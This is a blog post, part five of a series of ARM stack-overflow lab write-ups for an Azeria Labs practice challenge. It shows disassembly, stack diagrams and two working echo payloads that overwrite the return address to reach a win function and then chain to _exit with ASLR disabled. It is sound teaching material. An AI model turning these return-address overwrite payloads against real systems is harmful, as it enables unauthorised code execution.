<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Smashing ARM Stack for Fun - Part V</title>
  <meta name="description" content="Fifth challengewith a small introduction to process continuation.">

  
    <link href='//fonts.googleapis.com/css?family=Lato:400,400italic' rel='stylesheet' type='text/css'>
  

  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        extensions: ["tex2jax.js"],
        jax: ["input/TeX","output/HTML-CSS"],
        tex2jax: {inlineMath: [["$$","$$"],["\\(","\\)"]]},
	TeX: {
	  Macros: {
            
	  }
	}
      });
    </script>
    
      <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js' async></script>
    
  

  
    <script
       src="https://code.jquery.com/jquery-3.4.1.min.js"
       integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
       crossorigin="anonymous"></script>
  

  

    
      <script src='https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.9.1/underscore-min.js' ></script>
    

    
      <script src="https://d3js.org/d3.v4.min.js"></script>
    

    <script src='/book-of-gehn/js/venn/venn.min.js'></script>
    <script src='/book-of-gehn/js/venn/helper.js'></script>

    <script src='/book-of-gehn/js/fix_syntax_highlight.js'></script>
  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/tufte.css">
  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/latex.css">

  <link rel="canonical" href="/book-of-gehn/articles/2021/01/20/Smashing-ARM-Stack-for-Fun-Part-V.html">

  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/all.min.css">

  <link type="application/atom+xml" rel="alternate" href="/book-of-gehn/feed.xml" title="The Book of Gehn" />
</head>

  <body>
    <header>
	
		<h1 class="header-title"><a href="/book-of-gehn/">The Book of Gehn</a></h1>
		
		
	

    

    
</header>

    <article class="group">
      <h1>Smashing ARM Stack for Fun - Part V</h1>
<p class="subtitle">January 20, 2021</p>

<p><a href="https://github.com/azeria-labs/ARM-challenges">Fifth challenge</a>
with a small introduction to <em>process continuation</em>.<!--more--></p>

<h2 id="planning-the-exploit">Planning the exploit</h2>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">pdisass</span> <span class="o">&amp;</span><span class="n">main</span>
 <span class="err">►</span> <span class="mh">0x10464</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;</span>       <span class="k">push</span>   <span class="err">{</span><span class="n">fp</span><span class="p">,</span> <span class="n">lr</span><span class="err">}</span>
   <span class="mh">0x10468</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;</span>     <span class="k">add</span>    <span class="n">fp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="err">#</span><span class="mi">4</span>
   <span class="mh">0x1046c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;</span>     <span class="k">sub</span>    <span class="n">sp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x48</span>
   <span class="mh">0x10470</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;</span>    <span class="k">str</span>    <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mh">0x48</span><span class="err">]</span>
   <span class="mh">0x10474</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span>    <span class="k">str</span>    <span class="n">r1</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mh">0x4c</span><span class="err">]</span>
   <span class="mh">0x10478</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;</span>    <span class="k">sub</span>    <span class="n">r3</span><span class="p">,</span> <span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x44</span>
   <span class="mh">0x1047c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;</span>    <span class="k">mov</span>    <span class="n">r0</span><span class="p">,</span> <span class="n">r3</span>
   <span class="mh">0x10480</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">28</span><span class="o">&gt;</span>    <span class="n">bl</span>     <span class="err">#</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>

   <span class="mh">0x10484</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;</span>    <span class="k">mov</span>    <span class="n">r0</span><span class="p">,</span> <span class="n">r3</span>
   <span class="mh">0x10488</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">36</span><span class="o">&gt;</span>    <span class="k">sub</span>    <span class="n">sp</span><span class="p">,</span> <span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="mi">4</span>
   <span class="mh">0x1048c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">40</span><span class="o">&gt;</span>    <span class="k">pop</span>    <span class="err">{</span><span class="n">fp</span><span class="p">,</span> <span class="n">pc</span><span class="err">}</span>
</code></pre></div></div>

<p><code class="highlighter-rouge">sub r3, fp, #0x44</code> means that the buffer begins 0x44 bytes from <code class="highlighter-rouge">fp</code>,
the begin of the stack frame.</p>

<p>As we saw <a href="/book-of-gehn/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-I.html">previously</a>,
the stack frame includes the <em>previous</em> value
of <code class="highlighter-rouge">fp</code> but not <code class="highlighter-rouge">lr</code> which it is <em>immediately below</em>.</p>

<p>So a buffer overflow of 0x44 bytes will overwrite the stored <code class="highlighter-rouge">fp</code> and an
overflow of 0x48 will overwrite <code class="highlighter-rouge">fp</code> and <code class="highlighter-rouge">lr</code>.</p>

<p>If we do the latter, the function <code class="highlighter-rouge">main</code> will jump to
our own code on <em>return</em>.</p>

<p><label for="mn-5198f64a60eca243a2249c4909487aed" class="margin-toggle"> ⊕</label><input type="checkbox" id="mn-5198f64a60eca243a2249c4909487aed" class="margin-toggle" /><span class="marginnote">The left diagram shows the stack from lower
addresses (left) to higher addresses (right) and the <code class="highlighter-rouge">main</code>'s and
<code class="highlighter-rouge">__libc_start_main</code>'s stack frames (<code class="highlighter-rouge">main</code> and <code class="highlighter-rouge">start</code> for short)
 </span></p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">main</span> <span class="o">--------------</span><span class="n">v</span><span class="o">------</span> <span class="n">start</span>
<span class="p">.......</span>   <span class="n">fp</span>      <span class="n">lr</span>   <span class="o">|</span>  <span class="o">??</span>   <span class="o">??</span>   <span class="o">??</span>   <span class="o">??</span>
</code></pre></div></div>

<p>As you can see the <code class="highlighter-rouge">fp</code> and <code class="highlighter-rouge">lr</code> are stored in the stack as well as an
unknown local variables of <code class="highlighter-rouge">__libc_start_main</code>.</p>

<p>When the overflow occurs this is the result:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">main</span> <span class="o">---------------</span><span class="n">v</span><span class="o">-----</span> <span class="n">start</span>
<span class="p">.......</span>   <span class="n">fp</span>      <span class="n">lr</span>    <span class="o">|</span> <span class="o">??</span>   <span class="o">??</span>   <span class="o">??</span>   <span class="o">??</span>         <span class="p">(</span><span class="n">pre</span><span class="o">-</span><span class="n">exploit</span><span class="p">)</span>
    <span class="n">main</span> <span class="o">---------------</span><span class="n">v</span><span class="o">-----</span> <span class="n">start</span>
<span class="n">AAAAAAA</span>   <span class="n">BB</span>      <span class="n">addr1</span> <span class="o">|</span> <span class="o">??</span>   <span class="o">??</span>   <span class="o">??</span>   <span class="o">??</span>         <span class="p">(</span><span class="n">overflow</span><span class="p">)</span>
</code></pre></div></div>

<p>No more crazy stuff is needed here, we can jump to <code class="highlighter-rouge">win</code> (<code class="highlighter-rouge">addr1 == 0x1044c</code>)
directly.</p>

<h2 id="exploit-level-1">Exploit level 1</h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pi@raspberrypi:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s1">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x4c\x04\x01\x00'</span> | ./stack4
code flow successfully changed
Segmentation fault
</code></pre></div></div>

<p>Yeah! but that segfault looks sloppy.</p>

<h2 id="a-more-polite-exploit">A more <em>polite</em> exploit</h2>

<p>Once <code class="highlighter-rouge">win</code> executes it will pop from the stack the stored
<code class="highlighter-rouge">lr</code> and set it into <code class="highlighter-rouge">pc</code>.</p>

<p>We didn’t call <code class="highlighter-rouge">win</code> with <code class="highlighter-rouge">bl</code> or similar so the <code class="highlighter-rouge">lr</code> was never
set correctly and the value pushed in the stack by <code class="highlighter-rouge">win</code> was garbage.</p>

<p>When <code class="highlighter-rouge">win</code> returns will jump to who-knows-where.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">main</span> <span class="o">---------------</span><span class="n">v</span><span class="o">-----</span> <span class="n">start</span>
<span class="p">.......</span>   <span class="n">fp</span>      <span class="n">lr</span>    <span class="o">|</span> <span class="o">??</span>   <span class="o">??</span>   <span class="o">??</span>   <span class="o">??</span>         <span class="p">(</span><span class="n">pre</span><span class="o">-</span><span class="n">exploit</span><span class="p">)</span>
    <span class="n">win</span> <span class="o">----------------</span><span class="n">v</span><span class="o">-----</span> <span class="n">start</span>
          <span class="n">BB</span>      <span class="o">??</span>    <span class="o">|</span> <span class="o">??</span>   <span class="o">??</span>   <span class="o">??</span>   <span class="o">??</span>         <span class="p">(</span><span class="n">win</span> <span class="n">called</span><span class="p">)</span>
                  <span class="err">^</span>
                  <span class="k">ret</span> <span class="n">address</span> <span class="n">of</span> <span class="n">win</span>
</code></pre></div></div>

<p>And if we don’t jump to <code class="highlighter-rouge">win</code> exactly?</p>

<p>We could jump to the second instruction of <code class="highlighter-rouge">win</code>:
we will be <strong>skipping</strong> the <code class="highlighter-rouge">push</code>.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">pdisass</span> <span class="o">&amp;</span><span class="n">win</span>
   <span class="mh">0x1044c</span> <span class="o">&lt;</span><span class="n">win</span><span class="o">&gt;</span>        <span class="k">push</span>   <span class="err">{</span><span class="n">fp</span><span class="p">,</span> <span class="n">lr</span><span class="err">}</span>
 <span class="err">►</span> <span class="mh">0x10450</span> <span class="o">&lt;</span><span class="n">win</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;</span>      <span class="k">add</span>    <span class="n">fp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="err">#</span><span class="mi">4</span>
   <span class="mh">0x10454</span> <span class="o">&lt;</span><span class="n">win</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;</span>      <span class="n">ldr</span>    <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">4</span><span class="err">]</span>
   <span class="mh">0x10458</span> <span class="o">&lt;</span><span class="n">win</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;</span>     <span class="n">bl</span>     <span class="err">#</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>

   <span class="mh">0x1045c</span> <span class="o">&lt;</span><span class="n">win</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span>     <span class="k">pop</span>    <span class="err">{</span><span class="n">fp</span><span class="p">,</span> <span class="n">pc</span><span class="err">}</span>
</code></pre></div></div>

<p>In this way we can <em>emulate</em> the <code class="highlighter-rouge">push</code> of <code class="highlighter-rouge">fp</code> and <code class="highlighter-rouge">lr</code> adding 8 bytes
to our payload.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">main</span> <span class="o">---------------</span><span class="n">v</span><span class="o">---------</span> <span class="n">start</span>
<span class="p">.......</span>   <span class="n">fp</span>      <span class="n">lr</span>    <span class="o">|</span> <span class="o">??</span>    <span class="o">??</span>      <span class="o">??</span>   <span class="o">??</span>      <span class="p">(</span><span class="n">pre</span><span class="o">-</span><span class="n">exploit</span><span class="p">)</span>
    <span class="n">main</span> <span class="o">---------------</span><span class="n">v</span><span class="o">---------</span> <span class="n">start</span>
<span class="n">AAAAAAA</span>   <span class="n">BB</span>      <span class="n">addr1</span> <span class="o">|</span> <span class="n">CC</span>    <span class="n">addr2</span>   <span class="o">??</span>   <span class="o">??</span>      <span class="p">(</span><span class="n">overflow</span> <span class="n">extended</span><span class="p">)</span>
                        <span class="n">v</span><span class="o">---------</span> <span class="n">start</span>
          <span class="o">??</span>      <span class="o">??</span>    <span class="o">|</span> <span class="n">CC</span>    <span class="n">addr2</span> <span class="o">|</span> <span class="o">??</span>   <span class="o">??</span>      <span class="p">(</span><span class="n">win</span> <span class="n">called</span> <span class="n">without</span> <span class="k">push</span><span class="p">)</span>
        <span class="o">------</span> <span class="n">win</span> <span class="o">-------------------</span><span class="err">^</span>
</code></pre></div></div>

<p>So now we control where <code class="highlighter-rouge">win</code> will return: <code class="highlighter-rouge">addr2</code>.</p>

<h2 id="planning-a-controlled-exit">Planning a controlled exit</h2>

<p>An ideal situation would make the program continue running after
exploiting it, known as
<a href="https://azeria-labs.com/process-continuation-shellcode/">process continuation shellcode</a>
but it is too complex for now.</p>

<p>The simplest thing is to call
<a href="https://linux.die.net/man/2/_exit"><code class="highlighter-rouge">_exit</code></a>
a thin glib wrapper of <a href="https://man7.org/linux/man-pages/man2/exit_group.2.html"><code class="highlighter-rouge">exit_group</code></a>
syscall that exits the process and its threads.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">pdisass</span> <span class="o">&amp;</span><span class="n">_exit</span>
 <span class="err">►</span> <span class="mh">0xb6f1b934</span> <span class="o">&lt;</span><span class="n">_exit</span><span class="o">&gt;</span>       <span class="k">push</span>   <span class="err">{</span><span class="n">r7</span><span class="p">,</span> <span class="n">lr</span><span class="err">}</span>
   <span class="mh">0xb6f1b938</span> <span class="o">&lt;</span><span class="n">_exit</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;</span>     <span class="k">mov</span>    <span class="n">r2</span><span class="p">,</span> <span class="n">r0</span>
   <span class="mh">0xb6f1b93c</span> <span class="o">&lt;</span><span class="n">_exit</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;</span>     <span class="k">mov</span>    <span class="n">r7</span><span class="p">,</span> <span class="err">#</span><span class="mh">0xf8</span>
   <span class="mh">0xb6f1b940</span> <span class="o">&lt;</span><span class="n">_exit</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;</span>    <span class="n">svc</span>    <span class="err">#</span><span class="mi">0</span>
   <span class="mh">0xb6f1b944</span> <span class="o">&lt;</span><span class="n">_exit</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span>    <span class="n">cmn</span>    <span class="n">r0</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x1000</span>
   <span class="mh">0xb6f1b948</span> <span class="o">&lt;</span><span class="n">_exit</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;</span>    <span class="n">bhi</span>    <span class="err">#</span><span class="n">_exit</span><span class="o">+</span><span class="mi">68</span> <span class="o">&lt;</span><span class="n">_exit</span><span class="o">+</span><span class="mi">68</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>The <code class="highlighter-rouge">svc #0</code> is what it triggers the syscall. In Arm 32bits the
instruction is <code class="highlighter-rouge">swi</code> but the disassembler renames it to the newer name:
<em>supervisor call</em>.</p>

<p>The syscall number is passed to the kernel via <code class="highlighter-rouge">r7</code> as mentioned in <a href="https://man7.org/linux/man-pages/man2/syscall.2.html">man
syscall(2)</a>.</p>

<p>In our case <a href="https://github.com/torvalds/linux/blob/v4.17/arch/arm/tools/syscall.tbl#L265">0xf8 is the syscall number</a>
of
<a href="https://man7.org/linux/man-pages/man2/exit_group.2.html"><code class="highlighter-rouge">exit_group</code></a>.</p>

<h2 id="exploit-level-2">Exploit level 2</h2>

<p>We are going to cheat a little and disable ASLR so we can hardcode
the address of <code class="highlighter-rouge">_exit</code> (0xb6f1b934)</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pi@raspberrypi:~<span class="nv">$ </span>setarch linux32 <span class="nt">--addr-no-randomize</span> /bin/bash
<span class="o">(</span>aslr disabled<span class="o">)</span> pi@raspberrypi:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s1">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x50\x04\x01\x00BBBB\x34\xb9\xf1\xb6'</span> | ./stack4
code flow successfully changed

<span class="o">(</span>aslr disabled<span class="o">)</span> pi@raspberrypi:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$?</span>
31

<span class="o">(</span>aslr disabled<span class="o">)</span> pi@raspberrypi:~<span class="nv">$ </span><span class="nb">exit
exit</span>
</code></pre></div></div>

<p>As you can see the return code of the process was 31. I corroborated
with a debugger the value of the registers before the syscall and <code class="highlighter-rouge">r0</code>
was 31 as expected.</p>

<p>Instead of jumping to <code class="highlighter-rouge">_exit</code> we could jump before to a piece of code
–known as gadget– that sets <code class="highlighter-rouge">r0</code> to zero and then jump to <code class="highlighter-rouge">_exit</code>.</p>

<p>But that’s for another post.</p>




    </article>
    <span class="print-footer">Smashing ARM Stack for Fun - Part V - January 20, 2021 - Gehn</span>
    <footer>
    <hr class="slender">
    <div class="credits">
        <span>&copy; 2021
            
            Gehn
        </span></br>
            <a style="text-decoration: none;" href="/book-of-gehn/feed.xml"><img height="16px" width="16px" src="/book-of-gehn/assets/blog-assets/rss-32px.png" /></a>
        <br>
        

    
    </div>
</footer>

  </body>
</html>
